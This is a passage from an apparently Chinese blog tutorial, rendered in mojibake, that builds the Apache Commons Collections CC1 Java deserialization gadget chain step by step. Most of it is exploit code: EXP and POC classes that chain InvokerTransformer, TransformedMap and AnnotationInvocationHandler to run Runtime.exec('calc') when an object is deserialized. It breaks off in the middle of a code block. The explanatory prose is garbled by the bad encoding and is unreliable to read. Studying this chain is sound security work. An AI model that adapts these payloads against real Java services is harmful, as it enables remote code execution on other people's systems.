<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//æ„é€ å‡½æ•°</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-title function_">TransformedMap</span><span class="hljs-params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;<br>        <span class="hljs-built_in">super</span>(map);<br>        <span class="hljs-built_in">this</span>.keyTransformer = keyTransformer;<br>        <span class="hljs-built_in">this</span>.valueTransformer = valueTransformer;<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>ç„¶å<code>public</code>ä¿®é¥°çš„<code>decorate</code>å°±èƒ½ç›´æ¥<code>new</code>ä¸€ä¸ª<code>TransformedMap</code>å¯¹è±¡ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map <span class="hljs-title function_">decorate</span><span class="hljs-params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;<br>     <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);<br> &#125;<br></code></pre></td></tr></table></figure>

<p>æˆªæ­¢åˆ°ç›®å‰çš„æ€è·¯ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">TransformedMap.decorate -&gt; é€šè¿‡<span class="hljs-keyword">new</span>ä¸€ä¸ªå®ä¾‹<br>    è°ƒç”¨TransformedMapçš„æ„é€ æ–¹æ³• - &gt; ä»è€Œå®šä¹‰valueTransformer<br>    	è°ƒç”¨TransformedMapçš„checksetValue -&gt;<br>    		è°ƒç”¨valueTransformer.transform(value)<br><br>è¯´ç™½äº†å°±æ˜¯æ¢æ¡è·¯è°ƒç”¨transformæ–¹æ³•:<br>	æœ¬æ¥æ˜¯invokerTransformer.transform(runtime)ï¼Œç°åœ¨æ˜¯ä»TransformedMap.javaä¸‹èµ°è¿‡å»<br></code></pre></td></tr></table></figure>

<p><code>EXP</code>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs JAVA"><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;  <br>  <br><span class="hljs-keyword">import</span> java.lang.reflect.Method;  <br><span class="hljs-keyword">import</span> java.util.HashMap;  <br><span class="hljs-keyword">import</span> java.util.Map;  <br>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">decorateCalc</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();  <br> <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>  <br> , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);  <br> HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();  <br> <span class="hljs-type">Map</span> <span class="hljs-variable">decorateMap</span> <span class="hljs-operator">=</span> TransformedMap.decorate(hashMap, <span class="hljs-literal">null</span>, invokerTransformer);  <br> Class&lt;TransformedMap&gt; transformedMapClass = TransformedMap.class;  <br> <span class="hljs-type">Method</span> <span class="hljs-variable">checkSetValueMethod</span> <span class="hljs-operator">=</span> transformedMapClass.getDeclaredMethod(<span class="hljs-string">&quot;checkSetValue&quot;</span>, Object.class);  <br> checkSetValueMethod.setAccessible(<span class="hljs-literal">true</span>);  <br> checkSetValueMethod.invoke(decorateMap, runtime);  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥æ˜¯å“ªé‡Œè°ƒç”¨äº†è¿™ä¸ª<code>checkSetValue</code>ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//AbstractInputCheckedMapDecorator.java</span><br><span class="hljs-comment">//åŒæ—¶è¦æ³¨æ„è¿™ä¸œè¥¿æ˜¯TransformedMapçš„çˆ¶ç±»</span><br><br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object value)</span> &#123;<br>            value = parent.checkSetValue(value);<br>            <span class="hljs-keyword">return</span> entry.setValue(value);<br>        &#125;<br><span class="hljs-comment">//å®é™…ä¸Šå°±æ˜¯åœ¨ Map ä¸­å¯¹ä¸€ç»„ entryï¼ˆé”®å€¼å¯¹ï¼‰è¿›è¡Œ setValue() æ“ä½œ</span><br></code></pre></td></tr></table></figure>

<p>å†å¾€ä¸Šè·Ÿï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//AbstractMapEntryDecorator.java</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object object)</span> &#123;<br>        <span class="hljs-keyword">return</span> entry.setValue(object);<br>    &#125;<br></code></pre></td></tr></table></figure>

<p><code>setValue()</code> <strong>å®é™…ä¸Šå°±æ˜¯åœ¨ Map ä¸­å¯¹ä¸€ç»„ entryï¼ˆé”®å€¼å¯¹ï¼‰</strong>è¿›è¡Œ <code>setValue()</code> æ“ä½œã€‚</p>
<p>è¿˜å¾€ä¸Šè·Ÿï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//Map.java</span><br>V <span class="hljs-title function_">setValue</span><span class="hljs-params">(V value)</span>;<br></code></pre></td></tr></table></figure>

<p>å…ˆçœ‹ä¸‹<code>POC</code>æ€ä¹ˆå†™ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SetValueTest01</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;  <br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();  <br> <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>  <br> , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);  <br> HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();  <br> hashMap.put(<span class="hljs-string">&quot;key&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>);  <br> Map&lt;Object, Object&gt; decorateMap = TransformedMap.decorate(hashMap, <span class="hljs-literal">null</span>, invokerTransformer);  <br> <span class="hljs-keyword">for</span> (Map.Entry entry:decorateMap.entrySet())&#123;  <br>            entry.setValue(runtime);  <br> &#125;  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure>

<ul>
<li><code>decorateMap.entrySet()</code> è¿”å›<code>decorateMap</code>ä¸­çš„æ‰€æœ‰é”®å€¼å¯¹çš„é›†åˆã€‚</li>
<li><code>Map.Entry</code> æ˜¯ä¸€ä¸ªè¡¨ç¤ºMapä¸­çš„é”®å€¼å¯¹çš„æ¥å£ã€‚</li>
<li><code>entry.setValue(runtime)</code> å°†æ¯ä¸ªé”®å€¼å¯¹çš„å€¼è®¾ç½®ä¸º<code>runtime</code>çš„å€¼ã€‚</li>
</ul>
<p>å…¶å®æ¯”è¾ƒå…³é”®çš„ä»£ç æ˜¯è¿™ä¸¤éƒ¨åˆ†ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">hashMap.put(<span class="hljs-string">&quot;key&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>);  <span class="hljs-comment">//è¿™é‡Œå…ˆå¾€Mapé‡Œé¢æ”¾äº›å€¼</span><br><span class="hljs-keyword">for</span> (Map.Entry entry:decorateMap.entrySet())&#123;  <br>           entry.setValue(runtime);  <br>&#125;  <span class="hljs-comment">//éå†Mapè°ƒç”¨setValueæ–¹æ³•ï¼Œæ³¨æ„runtimeè¿™ä¸ªå‚æ•°ï¼š</span><br><span class="hljs-comment">//è¯´ç™½äº†è¿˜æ˜¯åœ¨ä¹‹å‰çš„åŸºç¡€ä¸Šè°ƒç”¨checksetValue(runtime)ï¼</span><br></code></pre></td></tr></table></figure>

<p>æ‰€ä»¥ç°åœ¨ç›®æ ‡å°±æ˜¯æ‰¾<code>readObject()</code> é‡Œé¢è°ƒç”¨äº† <code>setValue()</code>ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//AnnotationInvocationHandler.javaçš„readObjectæ–¹æ³•å­˜åœ¨ï¼š</span><br><span class="hljs-keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> memberValue.getKey();<br>            Class&lt;?&gt; memberType = memberTypes.get(name);<br>            <span class="hljs-keyword">if</span> (memberType != <span class="hljs-literal">null</span>) &#123;  <span class="hljs-comment">// i.e. member still exists</span><br>                <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> memberValue.getValue();<br>                <span class="hljs-keyword">if</span> (!(memberType.isInstance(value) ||<br>                      value <span class="hljs-keyword">instanceof</span> ExceptionProxy)) &#123;<br>                    memberValue.setValue(<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnnotationTypeMismatchExceptionProxy</span>(<br>                            value.getClass() + <span class="hljs-string">&quot;[&quot;</span> + value + <span class="hljs-string">&quot;]&quot;</span>).setMember(<br>                                annotationType.members().get(name)));<br>                &#125;<br>            &#125;<br></code></pre></td></tr></table></figure>

<p>è¿™é‡Œæ‹¿äº†DBå¸ˆå‚…çš„å›¾ï¼š</p>
<p><img src="/img/cc1.png" srcset="/img/loading.gif" lazyload alt="cc1"></p>
<p>é‚£ä¹ˆç°åœ¨æˆ‘ä»¬çš„ç›®çš„æ˜¯è¦è°ƒç”¨è¿™ä¸ªç±»ä¸‹çš„<code>readObject</code>æ–¹æ³•ï¼Œä½†æ³¨æ„ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">AnnotationInvocationHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">InvocationHandler</span>, Serializable<br></code></pre></td></tr></table></figure>

<p><code>Java</code>ä¸­ï¼Œå¦‚æœæ²¡æœ‰æ˜ç¡®æŒ‡å®šæƒé™ä¿®é¥°ç¬¦ï¼Œåˆ™é»˜è®¤ä½¿ç”¨çš„æ˜¯<code>default</code>ä¿®é¥°ç¬¦ã€‚ä½¿ç”¨<code>default</code>ä¿®é¥°ç¬¦ä¿®é¥°çš„ç±»å’Œæˆå‘˜å˜é‡ç­‰åªèƒ½åœ¨åŒä¸€ä¸ªåŒ…ä¸­è¢«è®¿é—®ï¼Œè€Œä¸èƒ½åœ¨å…¶ä»–åŒ…ä¸­è¢«è®¿é—®ã€‚æ‰€ä»¥å¾—é€šè¿‡åå°„è°ƒç”¨è¿™ä¸œè¥¿ã€‚</p>
<p>ç„¶åæ³¨æ„ä¼ å‚ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">AnnotationInvocationHandler(Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Annotation</span>&gt; type, Map&lt;String, Object&gt; memberValues)<br><span class="hljs-comment">//ç¬¬ä¸€ä¸ªæ”¾ä¸ªæ³¨è§£ç±»å‹ï¼Œç¬¬äºŒä¸ªæ”¾çš„æ˜¯æˆ‘ä»¬è¦éå†çš„transformedMap</span><br></code></pre></td></tr></table></figure>

<p>æ³¨è§£çš„è¯æ¯”å¦‚<code>@override</code>ï¼Œ<code>@Target</code>è¿™ç§</p>
<p>ç†æƒ³æƒ…å†µä¸‹çš„EXP:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Example;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;  <br>  <br><span class="hljs-keyword">import</span> java.io.*;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;  <br><span class="hljs-keyword">import</span> java.util.HashMap;  <br><span class="hljs-keyword">import</span> java.util.Map;  <br>  <br><span class="hljs-comment">// ç†æƒ³æƒ…å†µçš„ EXP</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TransformMapImagineEXP</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>  <br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();  <br> <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>  <br> , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);  <br> HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();  <br> hashMap.put(<span class="hljs-string">&quot;key&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>);  <br> Map&lt;Object, Object&gt; decorateMap = TransformedMap.decorate(hashMap, <span class="hljs-literal">null</span>, invokerTransformer);  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);  <br> <span class="hljs-type">Constructor</span> <span class="hljs-variable">aihConstructor</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);  <br> aihConstructor.setAccessible(<span class="hljs-literal">true</span>);  <br> <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> aihConstructor.newInstance(Override.class, decorateMap);  <br>  <br> <span class="hljs-comment">// åºåˆ—åŒ–ååºåˆ—åŒ–  </span><br> <span class="hljs-comment">//serialize(o);  </span><br> <span class="hljs-comment">//unserialize(&quot;ser.bin&quot;);  </span><br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;  <br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));  <br> oos.writeObject(obj);  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;  <br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));  <br> <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();  <br> <span class="hljs-keyword">return</span> obj;  <br> &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>å…¶å®æ€è·¯å°±æ˜¯é€šè¿‡åå°„è°ƒç”¨<code>AnnotationInvocationHandler</code>çš„æ„é€ å‡½æ•°(å®ä¾‹åŒ–ä¸€ä¸ª)ç„¶ååºåˆ—åŒ–ååºåˆ—åŒ–è§¦å‘é‡å†™çš„<code>readObject</code>æ–¹æ³•è¿›è€Œè°ƒç”¨ä¸Šé¢è¯´çš„<code>setValue</code>æ–¹æ³•ã€‚</p>
<p>è¿™æ®µä»£ç è‚¯å®šæ˜¯æ²¡ç»“æœçš„ï¼Œéœ€è¦è§£å†³ä¸€äº›é—®é¢˜ï¼š</p>
<p>1.<code>Runtime</code>å¯¹è±¡ä¸å¯åºåˆ—åŒ–(æ²¡æœ‰<code>implements Serializable</code>)</p>
<p><img src="/img/CC102.png" srcset="/img/loading.gif" lazyload alt="CC102"></p>
<p>è¿™ä¸œè¥¿å¾ˆå¥½è§£å†³ï¼šClasså¯¹è±¡æ˜¯å¯ä»¥åºåˆ—åŒ–çš„ï¼Œå…ˆå†™ä¸€æ®µåˆ©ç”¨åå°„å®ç°å¼¹è®¡ç®—å™¨çš„ä»£ç ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> FinalEXP;  <br>  <br><span class="hljs-keyword">import</span> java.lang.reflect.Method;  <br>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SolvedProblemRuntime</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Runtime.class;  <br> <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> c.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>);  <br> <span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> (Runtime) method.invoke(<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);  <br> <span class="hljs-type">Method</span> <span class="hljs-variable">run</span> <span class="hljs-operator">=</span> c.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);  <br> run.invoke(runtime, <span class="hljs-string">&quot;calc&quot;</span>);  <br> &#125;  <br>&#125;<br><span class="hljs-comment">//æ³¨æ„getRuntimeæ–¹æ³•æ˜¯é™æ€æ–¹æ³•</span><br></code></pre></td></tr></table></figure>

<p>å°†è¿™ä¸ªåå°„çš„ <code>Runtime</code> æ”¹é€ ä¸ºä½¿ç”¨ <code>InvokerTransformer.transform()</code> è°ƒç”¨çš„æ–¹å¼ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SolvedProblemRuntime</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  	 <br>        <br> <span class="hljs-type">Method</span> <span class="hljs-variable">getRuntimeMethod</span> <span class="hljs-operator">=</span> (Method) <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;).transform(Runtime.class);<br>        <span class="hljs-comment">//Class runtime = Runtime.class;</span><br>        <span class="hljs-comment">//ç›¸å½“äºï¼šMethod m1 = runtime.getDeclaredMethod(&quot;getRuntime&quot;);ï¼Œå…¶å®å°±æ˜¯é€šè¿‡åå°„æ‹¿åˆ°äº†getruntimeæ–¹æ³•ã€‚</span><br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> (Runtime) <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;).transform(getRuntimeMethod);<br>        <span class="hljs-comment">//ç›¸å½“äºï¼šRuntime run1 = (Runtime)m1.invoke(null,null);runtimeæ˜¯ä¸ªé™æ€æ–¹æ³•ä¸¤ä¸ªå‚æ•°ç½®ç©ºå°±è¡Œã€‚å…¶å®å°±æ˜¯è·å¾—äº†ä¸€ä¸ªruntimeçš„å®ä¾‹ã€‚</span><br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;).transform(r);<br>        <span class="hljs-comment">//ç›¸å½“äºä¸‹é¢è¿™ä¸ªä¸œè¥¿ï¼š</span><br>        <span class="hljs-comment">//        Method m2 = runtime.getDeclaredMethod(&quot;exec&quot;, String.class);</span><br>        <span class="hljs-comment">//        m2.invoke(run1,&quot;calc&quot;);</span><br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure>

<p>è¿™é‡Œå‘ç°æ¯ä¸ª<code>transform()</code>æ–¹æ³•çš„å‚æ•°éƒ½æ˜¯ä¸Šä¸€ä¸ªç»“æœï¼Œè¿™æ—¶å¯ä»¥åˆ©ç”¨<code>ChainedTransformer</code>ç±»ä¸‹çš„<code>transform</code>æ–¹æ³•è¿›è¡Œç®€å†™ã€‚æˆ‘ä»¬çœ‹ä¸‹è¿™ä¸ªä¸œè¥¿ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ChainedTransformer</span><span class="hljs-params">(Transformer[] transformers)</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>        iTransformers = transformers;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object object)</span> &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; iTransformers.length; i++) &#123;<br>            object = iTransformers[i].transform(object);<br>        &#125;<br>        <span class="hljs-keyword">return</span> object;<br>    &#125;<br><span class="hljs-comment">//æ”¾ä¸ªTransformeræ•°ç»„ï¼Œç„¶åè°ƒç”¨å¯¹åº”transformæ–¹æ³•</span><br></code></pre></td></tr></table></figure>

<p>ç°åœ¨æ€ä¹ˆæŠŠè¿™ä¸ª<code>ChainedTransformer</code>å¥—è¿›å»å°±å¾ˆæ¸…æ™°äº†ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ChainedTransformerEXP</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;  <br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;  <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>  <br> , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>  <br> , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span 